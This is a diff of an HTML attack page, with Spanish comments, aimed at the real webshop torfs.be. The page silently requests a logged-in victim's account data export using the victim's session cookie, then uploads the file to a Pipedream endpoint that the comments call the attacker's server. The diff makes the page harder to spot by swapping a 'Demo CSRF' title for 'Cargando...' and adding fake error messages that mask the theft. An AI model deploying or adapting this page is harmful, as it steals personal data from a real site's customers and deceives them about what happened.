@@ -1,35 +1,59 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Demo CSRF Exfiltración Datos - Torfs</title>
+  <meta charset="UTF-8">
+  <title>Cargando...</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      padding-top: 50px;
+      background-color: #f4f4f4;
+      color: #555;
+    }
+  </style>
 </head>
 <body>
-  <h2>Procesando...</h2>
+  <h2>Conectando al servidor...</h2>
+  <p>Por favor, espera un momento...</p>
+
   <script>
     // URL del endpoint vulnerable en torfs.be
     const dataDownloadUrl = "https://www.torfs.be/on/demandware.store/Sites-Torfs-Webshop-BE-Site/nl_BE/Account-DataDownload";
     
-    // URL de tu servidor atacante donde enviarás el archivo
+    // URL de tu endpoint en Pipedream
     const attackerUrl = "https://eoozwutroaqr7ij.m.pipedream.net";
 
-    // Hacer fetch del archivo con cookies incluidas (envía dwsid automáticamente)
+    // Paso 1: Descargar datos de Torfs.be usando la cookie de la víctima
     fetch(dataDownloadUrl, {
       method: "GET",
-      credentials: "include"  // importante para enviar cookies de torfs.be
+      credentials: "include"  // Incluye cookies como dwsid automáticamente
     })
-    .then(response => response.blob())
+    .then(response => {
+      if (!response.ok) {
+        throw new Error("Error al obtener datos: " + response.status);
+      }
+      return response.blob();
+    })
     .then(blob => {
-      // Preparar el archivo para enviar por POST a atacante
+      // Paso 2: Preparar archivo para enviarlo a tu servidor
       const formData = new FormData();
-      formData.append('file', blob, 'datos_victima');
+      formData.append('file', blob, 'datos_victima.zip');
 
-      // Enviar al servidor atacante
-      fetch(attackerUrl, {
+      // Paso 3: Enviar el archivo al atacante
+      return fetch(attackerUrl, {
         method: "POST",
         body: formData
       });
     })
-    .catch(e => console.error("Error:", e));
+    .then(() => {
+      // Mensaje para la víctima (opcional)
+      document.body.innerHTML = "<h2>Ocurrió un error, por favor intenta más tarde.</h2>";
+    })
+    .catch(err => {
+      console.error("Error:", err);
+      document.body.innerHTML = "<h2>El servicio está temporalmente no disponible.</h2>";
+    });
   </script>
 </body>
 </html>
